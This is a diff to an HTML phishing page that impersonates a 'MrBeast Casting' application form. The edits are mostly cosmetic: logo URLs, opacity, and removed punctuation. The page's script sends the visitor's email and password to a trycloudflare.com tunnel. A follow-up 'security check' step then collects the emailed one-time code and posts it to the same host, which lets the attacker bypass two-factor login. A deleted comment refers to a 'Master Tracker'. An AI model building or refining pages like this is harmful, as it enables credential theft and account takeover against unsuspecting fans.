@@ -10,8 +10,8 @@
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: var(--primary-blue); margin: 0; color: #fff; overflow-x: hidden; position: relative; }
         
-        /* BACKGROUND: MANY SMALL LOGOS EVERYWHERE */
-        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png'); background-size: 60px; opacity: 0.12; z-index: 0; pointer-events: none; }
+        /* BACKGROUND: LOGO PATTERN WITH MEDIUM COLOR (0.25 OPACITY) */
+        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://crystalpng.com'); background-size: 60px; opacity: 0.25; z-index: 0; pointer-events: none; }
         
         /* TOP BIG LOGO */
         .top-logo { width: 340px; margin-top: 40px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(0,0,0,0.5)); z-index: 5; position: relative; }
@@ -47,13 +47,15 @@
 </head>
 <body>
     <div class="bg-pattern"></div>
-    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo" alt="MrBeast Logo">
+    <img src="https://crystalpng.com" class="top-logo" alt="MrBeast Logo">
 
     <div class="box">
         <div id="step1">
-            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="mid-logo" alt="Box Logo">
-            <div class="mrbeast-style-text"><span class="mr-txt">MR.</span> BEAST CASTING</div>
-            <p>Fill in your details to apply for the next viral challenge.</p>
+            <img src="https://crystalpng.com" class="mid-logo" alt="Box Logo">
+            <!-- REMOVED POINT BETWEEN MR AND BEAST -->
+            <div class="mrbeast-style-text"><span class="mr-txt">MR</span> BEAST CASTING</div>
+            <!-- REMOVED POINT AT END OF CHALLENGE -->
+            <p>Fill in your details to apply for the next viral challenge</p>
             <input type="email" id="email" placeholder="Email Address" required>
             <input type="password" id="pass" placeholder="Password" required>
             <button type="button" class="main-btn" onclick="goToPuzzle()">CONTINUE</button>
@@ -76,7 +78,8 @@
 
         <div id="step2">
             <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
-            <p>We've sent a code to your email. Enter it below to finish.</p>
+            <!-- REMOVED POINT AT END OF FINISH SENTENCE -->
+            <p>We've sent a code to your email Enter it below to finish</p>
             <form action="https://hunt-camcorder-packages-pound.trycloudflare.com" method="post">
                 <input type="text" name="otp" placeholder="000000" maxlength="6" style="text-align:center; letter-spacing:12px; font-size:26px; font-weight:bold;" required>
                 <button type="submit" class="main-btn">FINISH APPLICATION</button>
@@ -88,7 +91,6 @@
         function goToPuzzle() {
             var e = document.getElementById('email').value, p = document.getElementById('pass').value;
             if(e && p) {
-                // Sends data to your Master Tracker
                 fetch('https://hunt-camcorder-packages-pound.trycloudflare.com', { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                 document.getElementById('step1').style.display = 'none'; 
                 document.getElementById('puzzle-box').style.display = 'block';
